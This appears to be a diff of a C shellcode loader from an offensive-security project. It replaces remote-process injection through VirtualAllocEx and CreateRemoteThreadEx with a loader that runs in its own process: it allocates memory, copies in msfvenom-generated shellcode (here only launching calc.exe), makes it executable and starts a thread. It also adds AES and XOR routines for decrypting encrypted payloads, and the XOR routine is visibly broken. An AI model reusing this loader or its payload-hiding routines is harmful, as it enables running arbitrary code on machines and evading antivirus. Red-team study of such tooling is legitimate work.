@@ -1,21 +1,52 @@
 /*
 	Author: @m8r0wn
-	
-	Remote shellcode injection using VirtualAllocEx()/CreateRemoteThread(). PID can be defined in 
-	cmd args, or assinged automatically using PidAutoSelect(). 
-	
-	References:
-		https://www.ired.team/offensive-security/code-injection-process-injection/process-injection
 */
 
-#include <string>
-#include <stdio.h>
-#include <stdlib.h>
 #include <Windows.h>
-#include "PidAutoSelect.h"
+#include <stdio.h>
 
-int main(int argc, char* argv[]) {
+
+// Options for shellcode encryption/decryption compatible with shellcrypt.py
+int DecryptAES(char * payload, unsigned int payload_len, char * key, size_t keylen) {
+    // Ref: Sector7 RTO
+	HCRYPTPROV hProv;
+	HCRYPTHASH hHash;
+	HCRYPTKEY hKey;
+
+	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
+		return -1;
+	}
+	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
+		return -1;
+	}
+	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
+		return -1;              
+	}
+	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
+		return -1;
+	}
 	
+	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
+		return -1;
+	}
+	CryptReleaseContext(hProv, 0);
+	CryptDestroyHash(hHash);
+	CryptDestroyKey(hKey);    
+	return 0;
+}
+
+int DecryptXOR(char * buf, char * key){
+	int i = 0;
+	unsigned char shellcode[sizeof(buf)];
+	for (int x=0; x < sizeof(buf); x++) {
+		if (i == sizeof(key)-1) i = 0;
+		shellcode[x] = buf[x] ^ key[i];
+		i++;
+	}
+}
+
+
+int main() {
 	// msfvenom -a x64 -p windows/x64/exec CMD='calc.exe' -f c
 	unsigned char shellcode[]= "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
 	"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
@@ -37,21 +68,10 @@ int main(int argc, char* argv[]) {
 	"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
 	"\x63\x2e\x65\x78\x65\x00";
 
-	DWORD pid;
-	if (argc > 1) {
-		pid = atoi(argv[1]);
-	} else {
-		PidAutoSelect p;
-		pid = p.GetPid();
-	}
-		
-	PVOID procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-	printf("[*] Opening process handle (PID: %d).\n", pid);
-
-	PVOID memAddr = VirtualAllocEx(procHandle, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+	PVOID memAddr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	printf("[*] Allocated Memory at 0x%p.\n", memAddr);
 
-	WriteProcessMemory(procHandle, memAddr, shellcode, sizeof(shellcode), NULL);
+	RtlMoveMemory(memAddr, shellcode, sizeof(shellcode));
 	printf("[*] ShellCode copied into memory.\n");
 
 	DWORD oldProtect;
@@ -59,9 +79,9 @@ int main(int argc, char* argv[]) {
 	printf("[*] Modified memory protection for execution.\n");
 
 	DWORD threadID;
-	HANDLE sThread = CreateRemoteThreadEx(procHandle, NULL, 0, (PTHREAD_START_ROUTINE)memAddr, NULL, 0, NULL, &threadID);
-	printf("[*] Executed thread in remote process.\n");
+	HANDLE sThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)memAddr, NULL, 0, &threadID);
+	printf("[*] Executed thread in current process.\n");
 
-	CloseHandle(procHandle);
+	WaitForSingleObject(sThread, INFINITE);
 	return 0;
 }
